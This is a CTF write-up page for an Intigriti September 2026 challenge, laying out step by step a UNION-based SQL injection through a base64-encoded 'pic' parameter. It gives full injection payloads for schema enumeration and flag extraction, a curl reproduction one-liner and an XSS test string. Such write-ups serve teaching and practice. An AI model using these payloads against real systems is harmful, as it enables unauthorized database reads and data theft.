@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Intigriti 0926 — Critter Gallery SQLi Writeup</title>
+<meta name="description" content="Writeup for Intigriti September 2026 CTF Challenge — UNION-based SQL Injection in Critter Gallery">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&family=DM+Sans:ital,wght@0,400;0,500;0,600;1,400&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+
+  :root {
+    --bg: #080c18;
+    --surface: #0f1528;
+    --surface-raised: #151d35;
+    --border: #1c2747;
+    --border-bright: #2a3a62;
+    --text: #e1e7ef;
+    --text-secondary: #8896b0;
+    --text-dim: #576380;
+    --accent: #38bdf8;
+    --accent-dim: #1a4a6b;
+    --green: #34d399;
+    --green-dim: #0d3b2a;
+    --red: #f87171;
+    --red-dim: #3b1515;
+    --amber: #fbbf24;
+    --amber-dim: #3b2f0a;
+    --purple: #a78bfa;
+    --purple-dim: #2a1f54;
+    --code-bg: #0a1020;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', system-ui, -apple-system, sans-serif;
+    line-height: 1.7;
+    padding: 0 20px;
+    max-width: 920px;
+    margin: 0 auto;
+  }
+
+  /* Hero */
+  .hero { padding: 56px 0 40px; text-align: center; }
+  .hero-eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px; font-weight: 500;
+    letter-spacing: 2.5px; text-transform: uppercase;
+    color: var(--accent); margin-bottom: 16px;
+  }
+  .hero h1 {
+    font-family: 'Sora', sans-serif;
+    font-size: clamp(28px, 5vw, 44px); font-weight: 800;
+    line-height: 1.15; margin: 0 0 12px;
+    background: linear-gradient(135deg, #e1e7ef 30%, var(--accent) 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .hero-sub { color: var(--text-secondary); font-size: 16px; margin: 0 0 32px; }
+  .hero-sub a { color: var(--accent); text-decoration: none; }
+
+  /* Flag */
+  .flag-banner {
+    display: inline-flex; align-items: center; gap: 12px;
+    background: var(--green-dim); border: 1px solid rgba(52,211,153,0.25);
+    border-radius: 8px; padding: 14px 24px; margin-bottom: 36px;
+    max-width: 100%; overflow-x: auto;
+  }
+  .flag-banner .flag-icon { font-size: 20px; flex-shrink: 0; }
+  .flag-banner code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: clamp(13px, 2.5vw, 16px); font-weight: 600;
+    color: var(--green); word-break: break-all;
+  }
+
+  /* Stats */
+  .stats {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 12px; margin-bottom: 48px;
+  }
+  .stat {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 16px; text-align: left;
+  }
+  .stat-label {
+    font-family: 'JetBrains Mono', monospace; font-size: 10px;
+    letter-spacing: 1.5px; text-transform: uppercase;
+    color: var(--text-dim); margin-bottom: 6px;
+  }
+  .stat-value { font-family: 'Sora', sans-serif; font-size: 15px; font-weight: 600; color: var(--text); }
+  .stat-value.accent { color: var(--accent); }
+  .stat-value.red { color: var(--red); }
+  .stat-value.green { color: var(--green); }
+
+  /* Headings */
+  h2 {
+    font-family: 'Sora', sans-serif; font-size: clamp(20px, 3.5vw, 26px);
+    font-weight: 700; margin: 56px 0 20px;
+    display: flex; align-items: center; gap: 12px; text-wrap: balance;
+  }
+  h2 .step-num {
+    font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600;
+    color: var(--accent); background: var(--accent-dim);
+    border-radius: 6px; padding: 4px 10px; flex-shrink: 0; letter-spacing: 0.5px;
+  }
+  h3 { font-family: 'Sora', sans-serif; font-size: 17px; font-weight: 600; margin: 28px 0 12px; }
+
+  /* Prose */
+  p { margin: 0 0 16px; color: var(--text-secondary); }
+  strong { color: var(--text); font-weight: 600; }
+
+  /* Code */
+  pre {
+    background: var(--code-bg); border: 1px solid var(--border);
+    border-radius: 8px; padding: 18px 20px; overflow-x: auto; margin: 0 0 20px;
+  }
+  pre code {
+    font-family: 'JetBrains Mono', monospace; font-size: 13.5px;
+    line-height: 1.65; color: var(--text);
+  }
+  .code-label {
+    font-family: 'JetBrains Mono', monospace; font-size: 10px;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    color: var(--text-dim); margin-bottom: 8px;
+  }
+  code {
+    font-family: 'JetBrains Mono', monospace; font-size: 0.9em;
+    background: var(--surface-raised); padding: 2px 6px;
+    border-radius: 4px; color: var(--accent);
+  }
+  pre code { background: none; padding: 0; }
+  .kw { color: var(--purple); font-weight: 500; }
+  .str { color: var(--green); }
+  .fn { color: var(--amber); }
+  .cm { color: var(--text-dim); font-style: italic; }
+  .op { color: var(--text-secondary); }
+  .flag-hl { color: var(--green); font-weight: 600; }
+
+  /* Screenshots */
+  .screenshot {
+    margin: 20px 0 28px; border-radius: 10px;
+    overflow: hidden; border: 1px solid var(--border); background: var(--surface);
+  }
+  .screenshot img { display: block; width: 100%; height: auto; }
+  .screenshot-caption {
+    padding: 12px 16px; font-size: 13px; color: var(--text-dim);
+    border-top: 1px solid var(--border);
+    display: flex; align-items: center; gap: 8px;
+  }
+  .screenshot-caption .sc-tag {
+    font-family: 'JetBrains Mono', monospace; font-size: 10px;
+    letter-spacing: 1px; text-transform: uppercase;
+    color: var(--accent); background: var(--accent-dim);
+    padding: 2px 8px; border-radius: 4px; flex-shrink: 0;
+  }
+
+  /* Callouts */
+  .callout { border-radius: 8px; padding: 16px 20px; margin: 20px 0; font-size: 14px; }
+  .callout p { margin: 0; }
+  .callout.insight { background: var(--accent-dim); border: 1px solid rgba(56,189,248,0.2); color: var(--accent); }
+  .callout.danger { background: var(--red-dim); border: 1px solid rgba(248,113,113,0.2); color: var(--red); }
+  .callout.success { background: var(--green-dim); border: 1px solid rgba(52,211,153,0.2); color: var(--green); }
+
+  /* Tables */
+  .table-wrap { overflow-x: auto; margin: 16px 0 24px; border-radius: 8px; border: 1px solid var(--border); }
+  table { width: 100%; border-collapse: collapse; font-size: 14px; }
+  th {
+    font-family: 'JetBrains Mono', monospace; font-size: 10px;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    color: var(--text-dim); background: var(--surface);
+    padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border);
+  }
+  td { padding: 10px 16px; border-bottom: 1px solid var(--border); color: var(--text-secondary); vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  td code { font-size: 12px; }
+
+  hr { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+
+  /* TOC */
+  .toc { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px 24px; margin: 0 0 16px; }
+  .toc-title { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: 1.5px; text-transform: uppercase; color: var(--text-dim); margin-bottom: 12px; }
+  .toc ol { list-style: none; padding: 0; margin: 0; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 6px 24px; }
+  .toc li { font-size: 14px; }
+  .toc a { color: var(--text-secondary); text-decoration: none; transition: color 0.15s; }
+  .toc a:hover { color: var(--accent); }
+  .toc .toc-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-dim); margin-right: 6px; }
+
+  /* Query box */
+  .query-box {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 20px; margin: 20px 0;
+    font-family: 'JetBrains Mono', monospace; font-size: 14px;
+    line-height: 1.8; overflow-x: auto;
+  }
+  .query-box .q-fixed { color: var(--text-dim); }
+  .query-box .q-inject { color: var(--red); font-weight: 600; }
+
+  /* Repro */
+  .repro-box { background: var(--code-bg); border: 2px solid var(--accent-dim); border-radius: 8px; padding: 20px; margin: 20px 0; }
+
+  /* Attack flow */
+  figure { margin: 28px 0; }
+  figure svg { max-width: 100%; height: auto; }
+  figcaption { font-size: 13px; color: var(--text-dim); text-align: center; margin-top: 12px; }
+
+  .footer { text-align: center; padding: 48px 0 40px; color: var(--text-dim); font-size: 13px; }
+
+  @media (max-width: 500px) {
+    .stats { grid-template-columns: 1fr 1fr; }
+    .toc ol { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-eyebrow">Intigriti Monthly Challenge &mdash; September 2026</div>
+  <h1>UNION-Based SQL Injection<br>in Critter Gallery</h1>
+  <p class="hero-sub">Challenge by <strong>khanhdlq</strong> &mdash; <a href="https://challenge-0926.challenges.intigriti.io/challenge.php" target="_blank" rel="noopener">challenge-0926.challenges.intigriti.io</a></p>
+  <div class="flag-banner">
+    <span class="flag-icon">&#127937;</span>
+    <code>INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</code>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats">
+  <div class="stat"><div class="stat-label">Bug Class</div><div class="stat-value red">SQL Injection</div></div>
+  <div class="stat"><div class="stat-label">Technique</div><div class="stat-value accent">UNION-based</div></div>
+  <div class="stat"><div class="stat-label">Parameter</div><div class="stat-value"><code>pic</code> (base64)</div></div>
+  <div class="stat"><div class="stat-label">Database</div><div class="stat-value">MySQL 8.0.46</div></div>
+  <div class="stat"><div class="stat-label">Schema</div><div class="stat-value">critter_gallery</div></div>
+  <div class="stat"><div class="stat-label">Impact</div><div class="stat-value green">Full DB Read</div></div>
+</div>
+
+<!-- TOC -->
+<nav class="toc">
+  <div class="toc-title">Contents</div>
+  <ol>
+    <li><span class="toc-num">01</span><a href="#recon">Reconnaissance</a></li>
+    <li><span class="toc-num">02</span><a href="#differential">The Case-Sensitivity Clue</a></li>
+    <li><span class="toc-num">03</span><a href="#sqli">Confirming SQL Injection</a></li>
+    <li><span class="toc-num">04</span><a href="#union">UNION Exploitation</a></li>
+    <li><span class="toc-num">05</span><a href="#enum">Schema Enumeration</a></li>
+    <li><span class="toc-num">06</span><a href="#flag">Flag Extraction</a></li>
+    <li><span class="toc-num">07</span><a href="#notes">Technical Notes</a></li>
+    <li><span class="toc-num">08</span><a href="#repro">Reproduction</a></li>
+  </ol>
+</nav>
+
+<!-- Attack flow -->
+<figure>
+  <svg viewBox="0 0 840 120" role="img" aria-label="Attack flow: user-controlled pic parameter is base64-decoded, injected into a SQL query unsanitised, and the UNION clause extracts the flag from secret_vault.">
+    <rect x="2" y="30" width="110" height="56" rx="8" fill="none" stroke="currentColor" stroke-width="1.5"/>
+    <text x="57" y="55" text-anchor="middle" fill="currentColor" font-family="JetBrains Mono,monospace" font-size="10" letter-spacing="0.5">?pic=eCcgVU5...</text>
+    <text x="57" y="72" text-anchor="middle" fill="#8896b0" font-family="DM Sans,sans-serif" font-size="10">base64 param</text>
+    <line x1="116" y1="58" x2="162" y2="58" stroke="currentColor" stroke-width="1.2"/>
+    <polygon points="162,54 172,58 162,62" fill="currentColor"/>
+    <rect x="176" y="30" width="120" height="56" rx="8" fill="none" stroke="currentColor" stroke-width="1.5"/>
+    <text x="236" y="55" text-anchor="middle" fill="#fbbf24" font-family="JetBrains Mono,monospace" font-size="10">base64_decode()</text>
+    <text x="236" y="72" text-anchor="middle" fill="#8896b0" font-family="DM Sans,sans-serif" font-size="10">PHP decodes</text>
+    <line x1="300" y1="58" x2="346" y2="58" stroke="currentColor" stroke-width="1.2"/>
+    <polygon points="346,54 356,58 346,62" fill="currentColor"/>
+    <rect x="360" y="30" width="140" height="56" rx="8" fill="#3b1515" stroke="#f87171" stroke-width="1.5"/>
+    <text x="430" y="51" text-anchor="middle" fill="#f87171" font-family="JetBrains Mono,monospace" font-size="10" font-weight="600">SELECT desc</text>
+    <text x="430" y="66" text-anchor="middle" fill="#f87171" font-family="JetBrains Mono,monospace" font-size="10" font-weight="600">WHERE name='$input'</text>
+    <text x="430" y="80" text-anchor="middle" fill="#8896b0" font-family="DM Sans,sans-serif" font-size="9">no sanitisation</text>
+    <line x1="504" y1="58" x2="550" y2="58" stroke="#f87171" stroke-width="1.2"/>
+    <polygon points="550,54 560,58 550,62" fill="#f87171"/>
+    <rect x="564" y="30" width="110" height="56" rx="8" fill="none" stroke="#a78bfa" stroke-width="1.5"/>
+    <text x="619" y="55" text-anchor="middle" fill="#a78bfa" font-family="JetBrains Mono,monospace" font-size="10" font-weight="600">UNION SELECT</text>
+    <text x="619" y="72" text-anchor="middle" fill="#8896b0" font-family="DM Sans,sans-serif" font-size="10">attacker query</text>
+    <line x1="678" y1="58" x2="724" y2="58" stroke="#34d399" stroke-width="1.2"/>
+    <polygon points="724,54 734,58 724,62" fill="#34d399"/>
+    <rect x="738" y="30" width="98" height="56" rx="8" fill="#0d3b2a" stroke="#34d399" stroke-width="1.5"/>
+    <text x="787" y="52" text-anchor="middle" fill="#34d399" font-family="JetBrains Mono,monospace" font-size="10" font-weight="600">FLAG</text>
+    <text x="787" y="68" text-anchor="middle" fill="#8896b0" font-family="DM Sans,sans-serif" font-size="10">secret_vault</text>
+  </svg>
+  <figcaption>Attack flow: user-controlled <code>pic</code> parameter &rarr; base64 decode &rarr; unsanitised SQL concatenation &rarr; UNION extraction &rarr; flag</figcaption>
+</figure>
+
+<hr>
+
+<!-- STEP 1 -->
+<h2 id="recon"><span class="step-num">01</span> Reconnaissance</h2>
+<p>The challenge is a "Critter Gallery" &mdash; a grid of animal emoji cards. Clicking a card navigates to a detail view at <code>challenge.php?pic=&lt;base64&gt;</code>. The base64 decodes to the animal's name: <code>Zm94</code> &rarr; <code>fox</code>, <code>cGFuZGE=</code> &rarr; <code>panda</code>, and so on.</p>
+<p>The detail card renders three things from the decoded name:</p>
+<div class="table-wrap">
+  <table>
+    <tr><th>Output</th><th>Source</th><th>Behaviour</th></tr>
+    <tr><td>Emoji art (large)</td><td>Application code</td><td>Case-<strong>sensitive</strong> lookup</td></tr>
+    <tr><td><code>&lt;h2&gt;</code> name</td><td>Decoded <code>pic</code> value</td><td>Reflected verbatim (HTML-escaped)</td></tr>
+    <tr><td>Description text</td><td>Database query</td><td>Case-<strong>insensitive</strong> lookup</td></tr>
+  </table>
+</div>
+<div class="screenshot">
+  <img src="screenshots/01_baseline_fox.png" alt="Normal detail card for fox showing emoji, name, and description">
+  <div class="screenshot-caption"><span class="sc-tag">Fig 1</span> Baseline &mdash; normal detail card for <code>fox</code></div>
+</div>
+
+<!-- STEP 2 -->
+<h2 id="differential"><span class="step-num">02</span> The Case-Sensitivity Clue</h2>
+<p>Testing the parameter with different casing reveals a <strong>normalisation differential</strong> &mdash; the key observation that unlocks the entire challenge:</p>
+<div class="table-wrap">
+  <table>
+    <tr><th><code>pic</code> decodes to</th><th>Emoji</th><th>Description</th></tr>
+    <tr><td><code>fox</code></td><td>&#129418; (fox)</td><td>Fox's description</td></tr>
+    <tr><td><code>FOX</code></td><td>&#128444; (default)</td><td><strong>Fox's description</strong></td></tr>
+    <tr><td><code>Fox</code></td><td>&#128444; (default)</td><td><strong>Fox's description</strong></td></tr>
+  </table>
+</div>
+<div class="callout insight">
+  <p><strong>Insight:</strong> The emoji lookup is case-sensitive (application code, likely an array map). The description lookup is case-insensitive &mdash; the hallmark of a MySQL <code>utf8mb4_..._ci</code> collation. Two different backends means the description is resolved by a SQL query.</p>
+</div>
+
+<!-- STEP 3 -->
+<h2 id="sqli"><span class="step-num">03</span> Confirming SQL Injection</h2>
+<h3>Breaking the query</h3>
+<p>A single quote (<code>'</code>) in the decoded name returns <strong>HTTP 200 with a zero-byte body</strong> &mdash; an uncaught database exception, not an input-validation rejection.</p>
+<div class="code-label">Error probe</div>
+<pre><code><span class="cm"># pic = base64("'") &rarr; Jw==</span>
+curl -s -o /dev/null -w <span class="str">"code=%{http_code} size=%{size_download}\n"</span> \
+  <span class="str">"https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Jw%3D%3D"</span>
+<span class="cm"># &rarr; code=200 size=0</span></code></pre>
+
+<h3>Boolean differential</h3>
+<p>Injecting a tautology vs. a contradiction controls whether the row is returned.</p>
+<div class="code-label">True condition &mdash; description returned</div>
+<pre><code><span class="str">fox</span><span class="op">'</span> <span class="kw">AND</span> <span class="str">'1'</span><span class="op">=</span><span class="str">'1</span></code></pre>
+<div class="screenshot">
+  <img src="screenshots/02_bool_true.png" alt="Boolean true: fox' AND '1'='1 returns the description">
+  <div class="screenshot-caption"><span class="sc-tag">Fig 2</span> <code>AND '1'='1</code> &rarr; description returned</div>
+</div>
+<div class="code-label">False condition &mdash; no results</div>
+<pre><code><span class="str">fox</span><span class="op">'</span> <span class="kw">AND</span> <span class="str">'1'</span><span class="op">=</span><span class="str">'2</span></code></pre>
+<div class="screenshot">
+  <img src="screenshots/03_bool_false.png" alt="Boolean false: fox' AND '1'='2 returns no critter message">
+  <div class="screenshot-caption"><span class="sc-tag">Fig 3</span> <code>AND '1'='2</code> &rarr; "No critter goes by that name yet."</div>
+</div>
+<p>The underlying query is now clear:</p>
+<div class="query-box">
+  <span class="q-fixed">SELECT description FROM animals WHERE name = '</span><span class="q-inject">{user input}</span><span class="q-fixed">'</span>
+</div>
+
+<!-- STEP 4 -->
+<h2 id="union"><span class="step-num">04</span> UNION Exploitation</h2>
+<p>Since the query projects <strong>one column</strong>, a <code>UNION SELECT</code> with a single value appends an attacker-controlled row to the result set.</p>
+<div class="code-label">UNION proof-of-concept</div>
+<pre><code><span class="str">fox</span><span class="op">'</span> <span class="kw">UNION SELECT</span> <span class="str">'INJECTED-BY-UNION'</span></code></pre>
+<div class="screenshot">
+  <img src="screenshots/04_union_proof.png" alt="UNION proof: injected string appears in description">
+  <div class="screenshot-caption"><span class="sc-tag">Fig 4</span> UNION proof &mdash; attacker-controlled string rendered in the description panel</div>
+</div>
+<div class="callout danger">
+  <p><strong>Impact confirmed:</strong> Arbitrary data from any accessible table can be read through this single-column UNION channel.</p>
+</div>
+
+<h3>Fingerprinting the backend</h3>
+<div class="code-label">Decoded payload</div>
+<pre><code><span class="str">x</span><span class="op">'</span> <span class="kw">UNION SELECT</span> <span class="fn">CONCAT</span>(<span class="fn">@@version</span>,<span class="str">' / '</span>,<span class="fn">database()</span>,<span class="str">' / '</span>,<span class="fn">user()</span>)<span class="cm">-- -</span></code></pre>
+<div class="screenshot">
+  <img src="screenshots/05_version_db_user.png" alt="Database fingerprint: MySQL 8.0.46 / critter_gallery / gallery@10.18.49.50">
+  <div class="screenshot-caption"><span class="sc-tag">Fig 5</span> <code>8.0.46 / critter_gallery / gallery@10.18.49.50</code></div>
+</div>
+<div class="table-wrap">
+  <table>
+    <tr><th>Property</th><th>Value</th></tr>
+    <tr><td>MySQL version</td><td><code>8.0.46</code></td></tr>
+    <tr><td>Database name</td><td><code>critter_gallery</code></td></tr>
+    <tr><td>DB user</td><td><code>gallery@10.18.49.50</code></td></tr>
+  </table>
+</div>
+
+<!-- STEP 5 -->
+<h2 id="enum"><span class="step-num">05</span> Schema Enumeration</h2>
+<h3>Tables</h3>
+<div class="code-label">Decoded payload</div>
+<pre><code><span class="str">x</span><span class="op">'</span> <span class="kw">UNION SELECT</span> (<span class="kw">SELECT</span> <span class="fn">GROUP_CONCAT</span>(table_name)
+  <span class="kw">FROM</span> information_schema.tables
+  <span class="kw">WHERE</span> table_schema=<span class="fn">database()</span>)<span class="cm">-- -</span></code></pre>
+<div class="screenshot">
+  <img src="screenshots/06_tables.png" alt="Table enumeration showing animals,secret_vault">
+  <div class="screenshot-caption"><span class="sc-tag">Fig 6</span> Tables: <code>animals</code>, <code>secret_vault</code></div>
+</div>
+<div class="callout insight">
+  <p><strong>Target acquired:</strong> <code>secret_vault</code> is a table that doesn't serve the gallery &mdash; it exists solely to hold the flag.</p>
+</div>
+
+<h3>Columns</h3>
+<div class="code-label">Decoded payload</div>
+<pre><code><span class="str">x</span><span class="op">'</span> <span class="kw">UNION SELECT</span> (<span class="kw">SELECT</span> <span class="fn">GROUP_CONCAT</span>(table_name,<span class="str">'.'</span>,column_name,<span class="str">' '</span>,column_type)
+  <span class="kw">FROM</span> information_schema.columns
+  <span class="kw">WHERE</span> table_schema=<span class="fn">database()</span> <span class="kw">AND</span> table_name=<span class="str">'secret_vault'</span>)<span class="cm">-- -</span></code></pre>
+<div class="screenshot">
+  <img src="screenshots/07_columns.png" alt="Columns: secret_vault.id int, secret_vault.note varchar(255)">
+  <div class="screenshot-caption"><span class="sc-tag">Fig 7</span> Columns: <code>id</code> (int), <code>note</code> (varchar 255)</div>
+</div>
+
+<!-- STEP 6 -->
+<h2 id="flag"><span class="step-num">06</span> Flag Extraction</h2>
+<p>With the schema fully mapped, extracting the flag is a single UNION query against the <code>note</code> column:</p>
+<div class="code-label">Final payload (decoded)</div>
+<pre><code><span class="str">x</span><span class="op">'</span> <span class="kw">UNION SELECT</span> note <span class="kw">FROM</span> secret_vault<span class="cm">-- -</span></code></pre>
+<div class="code-label">Base64-encoded URL</div>
+<pre><code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=<span class="flag-hl">eCcgVU5JT04gU0VMRUNUIG5vdGUgRlJPTSBzZWNyZXRfdmF1bHQtLSAt</span></code></pre>
+<div class="screenshot" style="border-color: rgba(52,211,153,0.3);">
+  <img src="screenshots/08_FLAG.png" alt="Flag displayed: INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}">
+  <div class="screenshot-caption"><span class="sc-tag" style="background:#0d3b2a;color:#34d399;">FLAG</span> <code style="color:#34d399;">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</code></div>
+</div>
+
+<hr>
+
+<!-- STEP 7 -->
+<h2 id="notes"><span class="step-num">07</span> Technical Notes</h2>
+<h3>Single-column constraint</h3>
+<p>The query projects exactly one column. A <code>UNION SELECT '1','2'</code> errors out, so every payload must project a single value. <code>GROUP_CONCAT()</code> collapses multiple rows and columns into one string to fit this constraint.</p>
+<h3>Comment syntax</h3>
+<p>MySQL requires whitespace after the <code>--</code> comment introducer. A bare <code>fox'--</code> produces the zero-byte error. The payloads use <code>-- -</code> (dash-dash-space-dash) to ensure proper termination. <code>#</code> also works.</p>
+<h3>No XSS</h3>
+<p>The description is emitted through <code>nl2br(htmlspecialchars(...))</code>. Injecting <code>&lt;img src=x onerror=alert(1)&gt;</code> via UNION returns the HTML-escaped version. The flag lives in the database, so script execution is neither required nor possible here.</p>
+<h3>Base64 encoding pitfall</h3>
+<p>PHP's <code>base64_decode</code> is non-strict. The <code>+</code> and <code>=</code> characters in base64 output must be URL-encoded as <code>%2B</code> / <code>%3D</code> or the browser mangles them into spaces, breaking the decoded payload.</p>
+
+<hr>
+
+<!-- STEP 8 -->
+<h2 id="repro"><span class="step-num">08</span> Reproduction</h2>
+<p>Copy-paste one-liner that extracts the flag from a terminal:</p>
+<div class="repro-box">
+<pre><code>curl -s <span class="str">"https://challenge-0926.challenges.intigriti.io/challenge.php?pic=$(
+  printf "%s" "x' UNION SELECT note FROM secret_vault-- -" | base64 -w0
+)"</span> | grep -oP <span class="str">'(?&lt;=class="desc"&gt;).*?(?=&lt;)'</span></code></pre>
+</div>
+<p>Expected output:</p>
+<pre><code><span class="flag-hl">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</span></code></pre>
+
+<hr>
+
+<div class="footer">
+  Written by <a href="https://github.com/xMalekk" style="color:var(--accent);text-decoration:none;">xMalekk</a> &mdash; Intigriti September 2026 CTF
+</div>
+
+</body>
+</html>
